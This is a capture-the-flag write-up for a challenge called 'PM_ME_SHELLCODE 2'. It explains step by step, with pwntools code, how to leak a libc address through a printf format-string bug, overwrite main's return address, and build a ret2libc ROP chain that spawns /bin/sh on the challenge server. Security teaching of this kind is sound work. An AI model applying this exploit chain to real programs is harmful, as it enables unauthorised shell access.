# PM_ME_SHELLCODE 2
# Difficulty: Medium

Assumption: Know about printf exploits, basic stack overflows, basic ROP theory
Ping me on discord (`garrettgu10#8125`) if you don't know these~!

We are told that this binary runs with ASLR enabled. Our first step is then to 
leak the libc base address, since this changes every time the binary runs.

We can leak values off the stack using the printf exploit, since printf() is 
called directly with our buffer, so we can input "%llx %llx %llx %llx" to leak
four 64-bit values off the stack. 

How do we know which value is a libc address? We can first run this binary 
"normally" under gef, then run "info sharedlibrary" to find the location that
libc is loaded into, for instance `0x00007ffff7de7630` - `0x00007ffff7f5c08f`.

We can then inspect the four leaked 64-bit values off the stack to find one 
that falls within this range. In this instance, the third value happens to be 
`7ffff7fad980`; we can run `x 7ffff7fad980` to find that this corresponds to
the symbol `_IO_2_1_stdin_`. 

However, we run into a problem. The program exits as soon as we leak the 
addresses. We can avoid this by overwriting the return address of `main()` with
`main()` itself, allowing us to start the program again. We run `disass main` 
to inspect the disassembly of `main()`. We see that the program subtracts 
`0x30` or 48 bytes from rbp in order to allocate the buffer. This means that 
our return address is 48 + 8 = 56 bytes away from the start of the buffer. The
extra 8 bytes are for the pushed rbp at the start of the function. 

Let's try overwriting the the return address of `main()` with `main()`. In GEF,
we can pipe the output of a python script to the input of the program using
`<<<`. We get the start of `main()` to be at`0x0000000000401176` from the 
disassembly from earlier. We can try this out with the following command:  
```run <<< $(python3 -c "import os; from pwn import *; os.write(1, b' '*56 + p64(0x0000000000401176) + b'\n');")```

We see that "Enter something" prints out twice, meaning our return address 
overwrite worked! Yay!

Let's start writing our pwntools script. We open the provided binary and libc:  
```python
from pwn import *

libc = ELF("libc-2.23.so")
e = ELF("shellcode")
```

In our pwntools script, we can combine the return address overwrite with the
stack leak:
```python
conn = remote("ctf.isss.io", 9009)
conn.recvline() # to "swallow" the "Enter something: " prompt
conn.send(b'%3$llx ' + b' '*(56 - 7) + p64(e.symbols['main']) + b'\n')
```
Note that `%3$llx` is just C-format-string for "give me the third item from the
stack as a 64-bit hex value."

We can then grab the leaked libc address as such, since it is followed by a 
space:
```python
io21 = int(conn.recvline().split(b' ')[0], 16)
```

We can get the libc base address by subtracting the offset of `_IO_2_1_stdin_`
relative to the base address:
```python
libcoff = io21 - libc.symbols['_IO_2_1_stdin_']
```

Finally, we want to perform a ret2libc by simulating a call to 
`system("/bin/sh")`. First we find where the string `/bin/sh` occurs within
libc:
```python
binsh = next(libc.search(b'/bin/sh')) + libcoff
# we add libcoff to get the real location of the string in the context of
# the running process
```

Since the first argument of any function is located at `rdi`, we need `rdi` to
point to our string. So we need to finda ROP gadget to `pop rdi` off the stack:
```python
rop = ROP(e)
poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
```

Putting everything together, we send the following payload:
```python
conn.send(b' '*56 + p64(poprdi) + p64(binsh) + p64(libcoff + libc.symbols['system']) + b'\n')
```

It's a bit hard to see what's going on in that last command, but once main() 
returns, it will return instead to the value we placed after the 56 bytes of
filler, which in this case is the location of the `pop rdi` gadget. Since a
`ret` was performed, that gadget location is now popped, so the stack pointer
now points to `p64(binsh)`, which is a pointer to where the string `/bin/sh`
occurs in the process's address space. The `pop rdi` gadget will then pop the
address into `rdi`, and `ret`. The `ret` will pop a return address off the 
stack which in this case happens to be `p64(libcoff + libc.symbols['system'])`,
or the entry point of `system()`. Since we popped `rdi`, `system()` will see 
that the value of `rdi` points to `"/bin/sh"`, so we get a shell!

The full solution code is available here at `solution.py`. Please ping me on 
Discord (`garrettgu10#8125`)if you have any issues understanding the exploit ^^